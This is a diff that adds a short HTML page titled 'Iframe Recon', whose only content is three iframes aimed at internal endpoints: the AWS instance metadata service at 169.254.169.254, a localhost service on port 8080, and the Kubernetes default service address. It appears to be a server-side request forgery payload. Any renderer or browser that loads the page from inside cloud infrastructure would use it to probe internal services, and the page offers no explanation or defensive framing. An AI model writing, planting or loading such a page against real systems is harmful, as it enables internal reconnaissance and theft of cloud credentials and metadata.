@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Iframe Recon</title>
+</head>
+<body>
+    <h1>Testing Subresources</h1>
+    <p>Loading internal frames...</p>
+
+    <h2>Frame 1: AWS Metadata</h2>
+    <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="400"></iframe>
+
+    <h2>Frame 2: Localhost Port 8080</h2>
+    <iframe src="http://127.0.0.1:8080" width="800" height="400"></iframe>
+    
+    <h2>Frame 3: K8s Default</h2>
+    <iframe src="https://kubernetes.default.svc" width="800" height="400"></iframe>
+
+</body>
+</html>
